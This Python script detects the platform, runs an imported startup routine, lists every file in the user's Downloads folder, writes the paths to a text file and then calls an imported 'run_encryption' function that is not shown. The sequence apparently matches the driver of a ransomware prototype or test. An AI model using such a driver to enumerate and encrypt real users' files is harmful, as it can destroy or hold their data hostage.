import os
from Commands import AdminCommandRunner
from encryption_test import run_encryption
from StartUp import main

# Define a mapping for the Downloads directory based on the platform
DOWNLOAD_DIRS = {
    "Windows": os.path.join(os.path.expanduser("~"), "Downloads"),
    "Linux": os.path.join(os.path.expanduser("~"), "Downloads"),
    "macOS": os.path.join(os.path.expanduser("~"), "Downloads"),
}

def explore_download_directory(download_path):
    """
    Explore the Downloads directory and collect all file paths.
    """
    discovered_files = []  # List to store discovered file paths

    # Check if the download path exists
    if not os.path.exists(download_path):
        print(f"Download directory does not exist: {download_path}")
        return discovered_files

    print(f"\nExploring Downloads Directory: {download_path}")

    # Iterate through all files and directories in the Downloads directory
    for root, dirs, files in os.walk(download_path):
        print(f"\nDirectory: {root}")

        # Collect and print all files
        if files:
            print("  Files:")
            for f in files:
                file_path = os.path.join(root, f)
                print(f"    - {file_path}")
                discovered_files.append(file_path)  # Store the full file path
        else:
            print("  No files")

    return discovered_files  # Return the list of discovered file paths

def get_download_path(platform):
    """Return the appropriate Downloads path based on the detected platform."""
    return DOWNLOAD_DIRS.get(platform, None)

def write_to_file(file_paths, output_file):
    """Write the collected file paths to a text file."""
    try:
        with open(output_file, 'w') as f:
            for path in file_paths:
                f.write(path + '\n')
        print(f"File paths successfully written to {output_file}")
    except Exception as e:
        print(f"Error writing to file: {e}")

if __name__ == "__main__":
    # Create an instance of AdminCommandRunner to detect the platform
    main()
    runner = AdminCommandRunner()
    platform = runner.detect_platform()

    print(f"Detected platform: {platform}")

    # Get the appropriate Downloads path
    download_path = get_download_path(platform)

    if download_path is None:
        print("Unsupported platform. Exiting.")
        exit(1)

    # Explore the Downloads directory
    try:
        discovered_files = explore_download_directory(download_path)  # Collect file paths
        write_to_file(discovered_files, "discovered_files.txt")  # Write paths to a text file
        run_encryption()
    except PermissionError as e:
        print(f"Permission error: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
